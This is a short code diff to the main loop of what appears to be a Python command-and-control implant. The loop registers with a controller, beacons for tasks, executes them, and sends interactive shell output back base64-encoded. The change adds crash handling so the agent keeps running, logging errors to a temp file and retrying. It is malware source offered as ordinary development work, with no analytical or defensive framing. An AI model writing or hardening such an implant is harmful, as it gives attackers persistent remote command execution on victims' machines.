@@ -424,22 +424,32 @@ if __name__ == "__main__":
     agent_id = get_agent_id()
     registered = False
     while True:
-        if not registered:
-            aid = register()
-            if aid:
-                agent_id = aid
-                registered = True
+        try:
+            if not registered:
+                aid = register()
+                if aid:
+                    agent_id = aid
+                    registered = True
 
-        tasks = beacon(agent_id)
-        for task in tasks:
-            execute_task(task)
+            tasks = beacon(agent_id)
+            for task in tasks:
+                execute_task(task)
 
-        if _pty_fd is not None:
-            out = _read_pty(0.3)
-            if out:
-                send_result("SHELL_DRAIN:" + base64.b64encode(out).decode())
+            if _pty_fd is not None:
+                out = _read_pty(0.3)
+                if out:
+                    send_result("SHELL_DRAIN:" + base64.b64encode(out).decode())
 
-        if _pty_fd is not None:
-            time.sleep(0.5)
-        else:
-            time.sleep(BEACON_INTERVAL)
+            if _pty_fd is not None:
+                time.sleep(0.5)
+            else:
+                time.sleep(BEACON_INTERVAL)
+        except Exception as e:
+            import traceback
+            err = traceback.format_exc()
+            try:
+                with open("/tmp/c2_agent_crash.log", "w") as f:
+                    f.write(f"{time.ctime()}: {e}\n{err}\n")
+            except Exception:
+                pass
+            time.sleep(5)
